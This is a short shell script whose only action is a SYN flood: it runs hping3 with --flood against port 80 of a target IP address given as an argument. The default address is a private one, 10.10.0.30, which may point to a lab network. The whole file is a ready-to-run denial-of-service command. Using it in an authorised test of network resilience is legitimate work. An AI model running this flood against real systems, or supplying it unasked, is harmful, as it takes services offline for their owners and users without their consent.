#!/bin/sh
TARGET=${1:-10.10.0.30}

# SYN flood (stop with Ctrl+C)
hping3 -S --flood -p 80 "$TARGET"
